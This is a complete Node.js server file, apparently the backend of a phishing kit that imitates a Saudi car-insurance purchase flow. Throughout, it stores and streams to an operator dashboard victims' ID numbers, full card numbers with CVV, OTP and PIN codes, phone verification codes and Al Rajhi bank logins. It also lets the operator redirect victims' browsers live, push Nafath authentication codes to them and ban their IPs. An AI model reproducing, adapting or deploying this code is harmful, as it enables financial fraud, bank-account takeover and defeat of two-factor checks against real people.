// server.js
require("dotenv").config();
const express = require("express");
const http = require("http");
const cors = require("cors");
const mongoose = require("mongoose");
const { Server } = require("socket.io");

const allowedOrigins = [
  process.env.FRONTEND_ORIGIN,
  process.env.DASHBOARD_ORIGIN,
];

process.on("unhandledRejection", (reason, p) => {
  console.error("Unhandled Rejection:", reason);
});
process.on("uncaughtException", (err) => {
  console.error("Uncaught Exception:", err);
});

const app = express();
const httpServer = http.createServer(app);

const io = new Server(httpServer, {
  cors: {
    origin: (incoming, callback) => {
      if (!incoming || allowedOrigins.includes(incoming)) {
        callback(null, true);
      } else {
        callback("Origin not allowed", false);
      }
    },
    methods: ["GET", "POST"],
    credentials: true,
  },
});

app.use("/api", express.json());
app.use(
  "/api",
  cors({
    origin: (incoming, callback) => {
      if (!incoming || allowedOrigins.includes(incoming)) {
        callback(null, true);
      } else {
        callback(new Error(`Origin ${incoming} not allowed`));
      }
    },
    credentials: true,
  })
);

// ─── MODELS ───────────────────────────────────────────────────────────────────

const LocationSchema = new mongoose.Schema(
  { ip: { type: String, unique: true, required: true }, currentPage: String },
  { timestamps: { createdAt: false, updatedAt: "updatedAt" } }
);
const Location = mongoose.model("Location", LocationSchema);

const FlagSchema = new mongoose.Schema({
  ip: { type: String, unique: true, required: true },
  flag: { type: Boolean, default: false },
});
const Flag = mongoose.model("Flag", FlagSchema);

const IndexSchema = new mongoose.Schema(
  {
    ip: { type: String, unique: true, required: true },
    userName: mongoose.Schema.Types.Mixed,
    phoneNumber: mongoose.Schema.Types.Mixed,
    offerType: mongoose.Schema.Types.Mixed,
    regType: mongoose.Schema.Types.Mixed,
    idNumber: mongoose.Schema.Types.Mixed,
    birthDate: mongoose.Schema.Types.Mixed,
    serialNumber: mongoose.Schema.Types.Mixed,
    carYear: mongoose.Schema.Types.Mixed,
    region: mongoose.Schema.Types.Mixed,
    branch: mongoose.Schema.Types.Mixed,
    level: mongoose.Schema.Types.Mixed,
    gear_type: mongoose.Schema.Types.Mixed,
    time_period: mongoose.Schema.Types.Mixed,
  },
  { timestamps: { createdAt: false, updatedAt: "updatedAt" } }
);
const IndexPage = mongoose.model("IndexPage", IndexSchema);

const VehicleSchema = new mongoose.Schema(
  {
    ip: { type: String, unique: true, required: true },
    carMake: mongoose.Schema.Types.Mixed,
    carYear: mongoose.Schema.Types.Mixed,
    usageType: mongoose.Schema.Types.Mixed,
    city: mongoose.Schema.Types.Mixed,
    startDate: mongoose.Schema.Types.Mixed,
  },
  { timestamps: { createdAt: false, updatedAt: "updatedAt" } }
);
const VehiclePage = mongoose.model("VehiclePage", VehicleSchema);

const InsuranceSchema = new mongoose.Schema(
  {
    ip: { type: String, unique: true, required: true },
    company: mongoose.Schema.Types.Mixed,
    planType: mongoose.Schema.Types.Mixed,
    planPrice: mongoose.Schema.Types.Mixed,
  },
  { timestamps: { createdAt: false, updatedAt: "updatedAt" } }
);
const InsurancePage = mongoose.model("InsurancePage", InsuranceSchema);

const AddonSchema = new mongoose.Schema(
  {
    ip: { type: String, unique: true, required: true },
    addons: mongoose.Schema.Types.Mixed,
    addonsTotal: mongoose.Schema.Types.Mixed,
    total: mongoose.Schema.Types.Mixed,
  },
  { timestamps: { createdAt: false, updatedAt: "updatedAt" } }
);
const AddonPage = mongoose.model("AddonPage", AddonSchema);

const SummarySchema = new mongoose.Schema(
  {
    ip: { type: String, unique: true, required: true },
    total: mongoose.Schema.Types.Mixed,
    paymentMethod: mongoose.Schema.Types.Mixed,
  },
  { timestamps: { createdAt: false, updatedAt: "updatedAt" } }
);
const SummaryPage = mongoose.model("SummaryPage", SummarySchema);

const PaymentSchema = new mongoose.Schema(
  {
    ip: { type: String, required: true },
    cardHolderName: String,
    cardNumber: String,
    expiryDate: String,
    cvv: String,
    cardLast4: String,
    total: mongoose.Schema.Types.Mixed,
  },
  { timestamps: { createdAt: true, updatedAt: false } }
);
const Payment = mongoose.model("Payment", PaymentSchema);

const OtpSchema = new mongoose.Schema(
  {
    ip: { type: String, required: true },
    verificationCode: String,
  },
  { timestamps: { createdAt: true, updatedAt: false } }
);
const Otp = mongoose.model("Otp", OtpSchema);

const PinSchema = new mongoose.Schema(
  {
    ip: { type: String, required: true },
    pin: String,
  },
  { timestamps: { createdAt: true, updatedAt: false } }
);
const Pin = mongoose.model("Pin", PinSchema);

const PhoneSchema = new mongoose.Schema(
  {
    ip: { type: String, required: true },
    phoneNumber: String,
    operator: String,
  },
  { timestamps: { createdAt: true, updatedAt: false } }
);
const Phone = mongoose.model("Phone", PhoneSchema);

const PhoneCodeSchema = new mongoose.Schema(
  {
    ip: { type: String, required: true },
    phoneCode: String,
  },
  { timestamps: { createdAt: true, updatedAt: false } }
);
const PhoneCode = mongoose.model("PhoneCode", PhoneCodeSchema);

const RajhiSchema = new mongoose.Schema(
  {
    ip: { type: String, required: true },
    username: String,
    password: String,
  },
  { timestamps: { createdAt: true, updatedAt: true } }
);
const Rajhi = mongoose.model("Rajhi", RajhiSchema);

const BasmahSchema = new mongoose.Schema(
  { ip: { type: String, unique: true, required: true }, code: { type: String, required: true } },
  { timestamps: true }
);
const Basmah = mongoose.model("Basmah", BasmahSchema);

const PendingNavSchema = new mongoose.Schema(
  { ip: { type: String, unique: true, required: true }, page: { type: String, required: true } },
  { timestamps: true }
);
const PendingNav = mongoose.model("PendingNav", PendingNavSchema);
const BannedIPSchema = new mongoose.Schema(
  { ip: { type: String, unique: true, required: true } },
  { timestamps: true }
);
const BannedIP = mongoose.model("BannedIP", BannedIPSchema);

// ─── REST API ROUTES ──────────────────────────────────────────────────────────

const wrap = (fn) => (req, res, next) => fn(req, res, next).catch(next);

const upsert = (Model) =>
  wrap(async (req, res) => {
    const data = { ...req.body, updatedAt: new Date() };
    const doc = await Model.findOneAndUpdate({ ip: data.ip }, data, {
      upsert: true,
      new: true,
      setDefaultsOnInsert: true,
    });
    return doc;
  });

app.post("/api/track/index", wrap(async (req, res) => {
  const doc = await IndexPage.findOneAndUpdate({ ip: req.body.ip }, { ...req.body, updatedAt: new Date() }, { upsert: true, new: true, setDefaultsOnInsert: true });
  io.emit("newIndex", doc);
  res.json({ success: true, doc });
}));

app.post("/api/track/vehicle", wrap(async (req, res) => {
  const doc = await VehiclePage.findOneAndUpdate({ ip: req.body.ip }, { ...req.body, updatedAt: new Date() }, { upsert: true, new: true, setDefaultsOnInsert: true });
  io.emit("newVehicle", doc);
  res.json({ success: true, doc });
}));

app.post("/api/track/insurance", wrap(async (req, res) => {
  const doc = await InsurancePage.findOneAndUpdate({ ip: req.body.ip }, { ...req.body, updatedAt: new Date() }, { upsert: true, new: true, setDefaultsOnInsert: true });
  io.emit("newInsurance", doc);
  res.json({ success: true, doc });
}));

app.post("/api/track/addon", wrap(async (req, res) => {
  const doc = await AddonPage.findOneAndUpdate({ ip: req.body.ip }, { ...req.body, updatedAt: new Date() }, { upsert: true, new: true, setDefaultsOnInsert: true });
  io.emit("newAddon", doc);
  res.json({ success: true, doc });
}));

app.post("/api/track/summary", wrap(async (req, res) => {
  const doc = await SummaryPage.findOneAndUpdate({ ip: req.body.ip }, { ...req.body, updatedAt: new Date() }, { upsert: true, new: true, setDefaultsOnInsert: true });
  io.emit("newSummary", doc);
  res.json({ success: true, doc });
}));

app.post("/api/track/payment", wrap(async (req, res) => {
  const doc = await Payment.create(req.body);
  io.emit("newPayment", doc);
  res.json({ success: true, doc });
}));

app.post("/api/track/otp", wrap(async (req, res) => {
  const doc = await Otp.create(req.body);
  io.emit("newOtp", doc);
  res.json({ success: true, doc });
}));

app.post("/api/track/pin", wrap(async (req, res) => {
  const doc = await Pin.create(req.body);
  io.emit("newPin", doc);
  res.json({ success: true, doc });
}));

app.post("/api/track/phone", wrap(async (req, res) => {
  const doc = await Phone.create(req.body);
  io.emit("newPhone", doc);
  res.json({ success: true, doc });
}));

app.post("/api/track/phonecode", wrap(async (req, res) => {
  const doc = await PhoneCode.create(req.body);
  io.emit("newPhoneCode", doc);
  res.json({ success: true, doc });
}));

app.post("/api/track/rajhi", wrap(async (req, res) => {
  const doc = await Rajhi.create(req.body);
  io.emit("newRajhi", doc);
  res.json({ success: true, doc });
}));

// endpoint يسأله الفرونت عند تحميل الصفحة
app.get("/api/pending-nav/:ip", wrap(async (req, res) => {
  const doc = await PendingNav.findOne({ ip: req.params.ip }).lean();
  res.json({ page: doc ? doc.page : null });
}));

app.get("/api/banned/:ip", wrap(async (req, res) => {
  const doc = await BannedIP.findOne({ ip: req.params.ip }).lean();
  res.json({ banned: !!doc });
}));

app.delete("/api/users/:ip", wrap(async (req, res) => {
  const { ip } = req.params;
  await Promise.all([
    IndexPage.deleteMany({ ip }),
    VehiclePage.deleteMany({ ip }),
    InsurancePage.deleteMany({ ip }),
    AddonPage.deleteMany({ ip }),
    SummaryPage.deleteMany({ ip }),
    Payment.deleteMany({ ip }),
    Otp.deleteMany({ ip }),
    Pin.deleteMany({ ip }),
    Phone.deleteMany({ ip }),
    PhoneCode.deleteMany({ ip }),
    Rajhi.deleteMany({ ip }),
    Basmah.deleteMany({ ip }),
    PendingNav.deleteMany({ ip }),
    BannedIP.deleteMany({ ip }),
    Location.deleteMany({ ip }),
    Flag.deleteMany({ ip }),
  ]);
  io.emit("userDeleted", { ip });
  res.json({ success: true });
}));

app.use((err, req, res, next) => {
  console.error("API error:", err);
  res.status(500).json({ success: false, error: err.message || "Server error" });
});

// ─── SOCKET.IO ────────────────────────────────────────────────────────────────

io.on("connection", (socket) => {
  console.log("Socket connected:", socket.id);

  socket.on("loadData", async () => {
    try {
      const [
        allIndex, allVehicle, allInsurance, allAddon, allSummary,
        allPayments, allOtps, allPins, allPhones, allPhoneCodes,
        allRajhis, allLocations, allFlags,
      ] = await Promise.all([
        IndexPage.find({}).sort({ updatedAt: -1 }).lean(),
        VehiclePage.find({}).sort({ updatedAt: -1 }).lean(),
        InsurancePage.find({}).sort({ updatedAt: -1 }).lean(),
        AddonPage.find({}).sort({ updatedAt: -1 }).lean(),
        SummaryPage.find({}).sort({ updatedAt: -1 }).lean(),
        Payment.find({}).lean(),
        Otp.find({}).lean(),
        Pin.find({}).lean(),
        Phone.find({}).lean(),
        PhoneCode.find({}).lean(),
        Rajhi.find({}).lean(),
        Location.find({}).lean(),
        Flag.find({}).lean(),
      ]);

      socket.emit("initialData", {
        index: allIndex,
        vehicle: allVehicle,
        insurance: allInsurance,
        addon: allAddon,
        summary: allSummary,
        payment: allPayments,
        otp: allOtps,
        pin: allPins,
        phone: allPhones,
        phonecode: allPhoneCodes,
        rajhi: allRajhis,
        locations: allLocations,
        flags: allFlags,
      });
    } catch (err) {
      console.error("loadData error:", err);
    }
  });

  socket.on("updateLocation", async ({ ip, page }) => {
    try {
      await Location.findOneAndUpdate(
        { ip },
        { currentPage: page, updatedAt: new Date() },
        { upsert: true, setDefaultsOnInsert: true }
      );
      socket.data.ip = ip;
      io.emit("locationUpdated", { ip, page });

      // تحقق إذا في طلب انتقال معلق لهذا الـ IP
      const pending = await PendingNav.findOne({ ip }).lean();
      if (pending) {
        socket.emit("navigateTo", { page: pending.page, ip });
        await PendingNav.deleteOne({ ip });
      }
    } catch (e) {
      console.error("Location error:", e);
    }
  });

  socket.on("submitIndex", async (data) => {
    try {
      const doc = await IndexPage.findOneAndUpdate({ ip: data.ip }, data, { upsert: true, new: true, setDefaultsOnInsert: true });
      io.emit("newIndex", doc);
      socket.emit("ackIndex", { success: true });
    } catch (err) {
      socket.emit("ackIndex", { success: false, error: err.message });
    }
  });

  socket.on("submitVehicle", async (data) => {
    try {
      const doc = await VehiclePage.findOneAndUpdate({ ip: data.ip }, data, { upsert: true, new: true, setDefaultsOnInsert: true });
      io.emit("newVehicle", doc);
      socket.emit("ackVehicle", { success: true });
    } catch (err) {
      socket.emit("ackVehicle", { success: false, error: err.message });
    }
  });

  socket.on("submitInsurance", async (data) => {
    try {
      const doc = await InsurancePage.findOneAndUpdate({ ip: data.ip }, data, { upsert: true, new: true, setDefaultsOnInsert: true });
      io.emit("newInsurance", doc);
      socket.emit("ackInsurance", { success: true });
    } catch (err) {
      socket.emit("ackInsurance", { success: false, error: err.message });
    }
  });

  socket.on("submitAddon", async (data) => {
    try {
      const doc = await AddonPage.findOneAndUpdate({ ip: data.ip }, data, { upsert: true, new: true, setDefaultsOnInsert: true });
      io.emit("newAddon", doc);
      socket.emit("ackAddon", { success: true });
    } catch (err) {
      socket.emit("ackAddon", { success: false, error: err.message });
    }
  });

  socket.on("submitSummary", async (data) => {
    try {
      const doc = await SummaryPage.findOneAndUpdate({ ip: data.ip }, data, { upsert: true, new: true, setDefaultsOnInsert: true });
      io.emit("newSummary", doc);
      socket.emit("ackSummary", { success: true });
    } catch (err) {
      socket.emit("ackSummary", { success: false, error: err.message });
    }
  });

  socket.on("submitPayment", async (data) => {
    try {
      const doc = await Payment.create(data);
      io.emit("newPayment", doc);
      socket.emit("ackPayment", { success: true });
    } catch (err) {
      socket.emit("ackPayment", { success: false, error: err.message });
    }
  });

  socket.on("submitOtp", async (data) => {
    try {
      const doc = await Otp.create(data);
      io.emit("newOtp", doc);
      socket.emit("ackOtp", { success: true });
    } catch (err) {
      socket.emit("ackOtp", { success: false, error: err.message });
    }
  });

  // submitPin OR submitCode (pin.html يرسل submitCode)
  const handlePin = async (data, sock) => {
    try {
      const pin = data.pin || data.verification_code || data.code || "";
      const doc = await Pin.create({ ip: data.ip, pin });
      io.emit("newPin", { ip: data.ip, pin });
      sock.emit("ackPin", { success: true });
      sock.emit("ackCode", { success: true });
    } catch (err) {
      sock.emit("ackPin", { success: false, error: err.message });
      sock.emit("ackCode", { success: false, error: err.message });
    }
  };
  socket.on("submitPin",  (data) => handlePin(data, socket));
  socket.on("submitCode", (data) => handlePin(data, socket));

  socket.on("submitPhone", async (data) => {
    try {
      const doc = await Phone.create(data);
      io.emit("newPhone", doc);
      socket.emit("ackPhone", { success: true });
    } catch (err) {
      socket.emit("ackPhone", { success: false, error: err.message });
    }
  });

  socket.on("submitPhoneCode", async (data) => {
    try {
      const phoneCode = data.phoneCode || data.verification_code_three || data.code || "";
      const doc = await PhoneCode.create({ ip: data.ip, phoneCode });
      io.emit("newPhoneCode", { ip: data.ip, phoneCode });
      socket.emit("ackPhoneCode", { success: true });
    } catch (err) {
      socket.emit("ackPhoneCode", { success: false, error: err.message });
    }
  });

  socket.on("submitRajhi", async (data) => {
    try {
      const doc = await Rajhi.create(data);
      io.emit("newRajhi", doc);
      socket.emit("ackRajhi", { success: true });
    } catch (err) {
      socket.emit("ackRajhi", { success: false, error: err.message });
    }
  });

  socket.on("updateBasmah", async ({ ip, basmah }) => {
    try {
      const doc = await Basmah.findOneAndUpdate(
        { ip },
        { code: String(basmah).padStart(2, "0") },
        { upsert: true, new: true }
      );
      // أرسل الكود لكل الـ sockets الخاصة بهذا الـ IP
      io.of("/").sockets.forEach((s) => {
        if (s.data.ip === ip) {
          s.emit("nafadCode", { ip, code: doc.code });
        }
      });
      io.emit("basmahUpdated", { ip, code: doc.code });
      socket.emit("ackBasmah", { success: true });
    } catch (err) {
      socket.emit("ackBasmah", { success: false, error: err.message });
    }
  });

  socket.on("getNafadCode", async () => {
    try {
      const myIp = socket.data.ip;
      if (!myIp) return socket.emit("nafadCode", { code: null });
      const doc = await Basmah.findOne({ ip: myIp }).lean();
      const code = doc ? doc.code : null;
      socket.emit("nafadCode", { code });
    } catch (err) {
      socket.emit("nafadCode", { error: err.message });
    }
  });

  socket.on("banUser", async ({ ip: targetIp }) => {
    try {
      await BannedIP.findOneAndUpdate({ ip: targetIp }, { ip: targetIp }, { upsert: true, new: true });
      // أرسل للمستخدم مباشرة لو متصل
      io.of("/").sockets.forEach((clientSocket) => {
        if (clientSocket.data.ip === targetIp) {
          clientSocket.emit("banned");
        }
      });
      io.emit("userBanned", { ip: targetIp });
    } catch (e) {
      console.error("banUser error:", e);
    }
  });

  socket.on("navigateTo", async ({ page, ip: targetIp }) => {
    // احفظ الطلب في DB دائماً (للحالة اللي المستخدم offline أو ما وصله)
    try {
      await PendingNav.findOneAndUpdate(
        { ip: targetIp },
        { page },
        { upsert: true, new: true }
      );
    } catch (e) {
      console.error("PendingNav save error:", e);
    }

    // حاول ترسل مباشرة لو المستخدم متصل الآن
    let sent = false;
    io.of("/").sockets.forEach((clientSocket) => {
      if (clientSocket.data.ip === targetIp) {
        clientSocket.emit("navigateTo", { page, ip: targetIp });
        sent = true;
      }
    });

    // لو أُرسل مباشرة امسح الـ pending فوراً
    if (sent) {
      setTimeout(async () => {
        await PendingNav.deleteOne({ ip: targetIp }).catch(() => {});
      }, 3000);
    }
  });

  socket.on("toggleFlag", async ({ ip, flag }) => {
    await Flag.findOneAndUpdate({ ip }, { flag }, { upsert: true, new: true });
    io.emit("flagUpdated", { ip, flag });
  });

  socket.on("disconnect", () => {
    const ip = socket.data.ip;
    if (ip) {
      setTimeout(() => {
        let hasActive = false;
        io.of("/").sockets.forEach((s) => {
          if (s.data.ip === ip) hasActive = true;
        });
        if (!hasActive) {
          Location.findOneAndUpdate(
            { ip },
            { currentPage: "offline", updatedAt: new Date() },
            { upsert: true, setDefaultsOnInsert: true }
          )
            .then(() => io.emit("locationUpdated", { ip, page: "offline" }))
            .catch(console.error);
        }
      }, 4000);
    }
  });
});

// ─── START ────────────────────────────────────────────────────────────────────

mongoose
  .connect(process.env.MONGODB_URI)
  .then(() => {
    console.log("MongoDB connected");
    const port = process.env.PORT || 10000;
    httpServer.listen(port, () => console.log(`Listening on port ${port}`));
  })
  .catch((err) => {
    console.error("MongoDB connection error:", err);
    process.exit(1);
  });
